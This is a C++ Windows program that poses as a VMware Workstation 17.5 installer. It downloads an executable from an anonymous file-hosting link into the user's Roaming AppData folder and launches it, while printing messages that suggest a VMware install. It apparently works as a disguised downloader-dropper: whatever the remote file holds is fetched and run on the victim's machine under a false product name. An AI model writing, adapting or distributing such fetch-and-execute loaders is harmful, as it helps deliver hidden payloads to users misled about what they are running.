#include <iostream>
#include <Windows.h>
#include <Urlmon.h>
#include <Shellapi.h>
#include <Shlobj.h>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "shell32.lib")

int main() {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);

    PWSTR appDataPath = NULL;
    SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &appDataPath);

    WCHAR filePath[MAX_PATH];
    wcscpy_s(filePath, appDataPath);
    wcscat_s(filePath, L"\\VMwareWorkstation17.52.exe");

    std::wcout << L"VMware Version: 17.5\n";
    std::wcout << L"[VMWARE17] Downloading...\n";
    HRESULT hr = URLDownloadToFile(NULL, L"https://31.filelu.com/d/w53nsgtqjtkfljtazkmmmz7kzsjyvuov3rzcwthfwo5bqoryiwl6fgatzcabhwtlytbzb6an/VMwareWorkstation17.52.exe", filePath, 0, NULL);
    if (hr != S_OK) {
        std::wcerr << L"Error downloading file: " << hr << std::endl;
    }
    else {
        std::wcout << L"Running VMWARE... You may close the cmd in 5 seconds.\n";
        HINSTANCE hInstance = ShellExecuteW(NULL, L"open", filePath, NULL, NULL, SW_SHOW);
        if (hInstance == (HINSTANCE)NULL) {
            std::wcerr << L"Error running VMWARE.\n";
        }
    }

    CoTaskMemFree(appDataPath);

    SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_INTENSITY);
    std::wcout << L"\n";
    std::wcin.get();
    return 0;
}
